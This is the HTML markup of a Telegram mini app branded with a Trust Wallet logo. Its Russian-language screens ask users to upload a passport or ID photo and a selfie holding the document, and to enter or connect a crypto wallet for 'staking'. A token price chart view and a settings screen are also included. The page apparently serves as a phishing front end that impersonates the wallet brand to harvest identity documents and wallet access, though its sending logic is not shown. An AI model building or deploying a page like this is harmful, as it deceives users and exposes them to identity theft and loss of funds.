<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Trust Mini App</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
</head>
<body>
    <div class="app-container">
        <!-- Главный экран -->
        <div id="mainScreen" class="screen active">
            <div class="header">
                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Trust_Wallet_logo_%282026%29.png" alt="Logo" class="logo">
                <button class="settings-btn" id="settingsBtn">⚙️</button>
            </div>
            
            <div class="card">
                <h3 class="card-title" data-i18n="verify_title">Верификация личности</h3>
                <div class="input-group">
                    <label class="label" data-i18n="doc_label">Документ (ID / Паспорт)</label>
                    <div class="file-upload-wrapper" id="wrapperDoc">
                        <input type="file" id="docInput" accept="image/*">
                        <div class="file-custom">
                            <img id="previewDoc" class="preview-img hidden">
                            <span id="textDoc" data-i18n="choose_photo">Выбрать фото</span>
                        </div>
                    </div>
                </div>
                <div class="input-group">
                    <label class="label" data-i18n="selfie_label">Селфи с документом</label>
                    <div class="file-upload-wrapper" id="wrapperSelfie">
                        <input type="file" id="selfieInput" accept="image/*">
                        <div class="file-custom">
                            <img id="previewSelfie" class="preview-img hidden">
                            <span id="textSelfie" data-i18n="take_photo">Сделать фото</span>
                        </div>
                    </div>
                </div>
                <button id="verifyBtn" class="btn btn-primary" data-i18n="send_data">Отправить данные</button>
            </div>

            <div class="card">
                <h3 class="card-title" data-i18n="staking_title">Стейкинг активов</h3>
                <div class="input-group">
                    <input type="text" id="walletInput" placeholder="0x..." class="text-input" data-i18n-placeholder="wallet_placeholder">
                </div>
                <button id="stakingBtn" class="btn btn-outline" data-i18n="connect_wallet">Подключить кошелек</button>
            </div>

            <div class="card tokens-card">
                <div class="tokens-tabs">
                    <span class="tab active">Top</span>
                    <span class="tab">BNB</span>
                    <span class="tab">ETH</span>
                </div>
                <div id="tokensList" class="tokens-list">
                    <div class="loading" data-i18n="loading">Загрузка...</div>
                </div>
            </div>
        </div>

        <!-- Экран настроек -->
        <div id="settingsScreen" class="screen">
            <div class="screen-header">
                <button class="back-btn" id="backFromSettings">←</button>
                <h2 data-i18n="settings">Настройки</h2>
            </div>
            <div class="card menu-card" id="helpBtn">
                <span data-i18n="help_support">Помощь и поддержка</span>
                <span class="arrow">›</span>
            </div>
            <div class="card menu-card" id="langBtn">
                <span data-i18n="language">Язык</span>
                <span class="arrow">›</span>
            </div>
            <div class="card menu-card" id="privacyBtn">
                <span data-i18n="privacy">Политика конфиденциальности</span>
                <span class="arrow">›</span>
            </div>
        </div>

        <!-- Экран выбора языка -->
        <div id="langScreen" class="screen">
            <div class="screen-header">
                <button class="back-btn" id="backFromLang">←</button>
                <h2 data-i18n="language">Язык</h2>
            </div>
            <div class="card lang-card">
                <label class="lang-option"><span>Русский - RU</span><input type="radio" name="lang" value="ru"></label>
                <label class="lang-option"><span>English - EN</span><input type="radio" name="lang" value="en"></label>
                <label class="lang-option"><span>Français - FR</span><input type="radio" name="lang" value="fr"></label>
                <label class="lang-option"><span>Deutsch - DE</span><input type="radio" name="lang" value="de"></label>
            </div>
        </div>

        <!-- Экран монеты -->
        <div id="coinScreen" class="screen">
            <div class="screen-header">
                <button class="back-btn" id="backFromCoin">←</button>
                <h2 id="coinName">Coin</h2>
            </div>
            <div class="card coin-main-card">
                <div class="coin-price-block">
                    <div id="coinPrice" class="coin-big-price">$0.00</div>
                    <div id="coinChange" class="coin-change">0.00%</div>
                </div>
                <div class="chart-periods">
                    <button class="period-btn active">1Д</button>
                    <button class="period-btn">1Н</button>
                    <button class="period-btn">1М</button>
                </div>
                <div class="chart-container">
                    <canvas id="coinChartCanvas"></canvas>
                </div>
            </div>
            <h3 class="section-title" data-i18n="statistics">Статистика</h3>
            <div class="card stats-grey-card">
                <div class="stat-row">
                    <span data-i18n="market_cap">Капитализация</span>
                    <span id="statMcap">—</span>
                </div>
                <div class="stat-row">
                    <span data-i18n="circulating">В обращении</span>
                    <span id="statCirc">—</span>
                </div>
                <div class="stat-row">
                    <span data-i18n="volume_24h">Объём (24 ч)</span>
                    <span id="statVol">—</span>
                </div>
            </div>
        </div>

        <div id="status" class="status-toast hidden"></div>
    </div>
    <script src="script.js"></script>
</body>
</html>
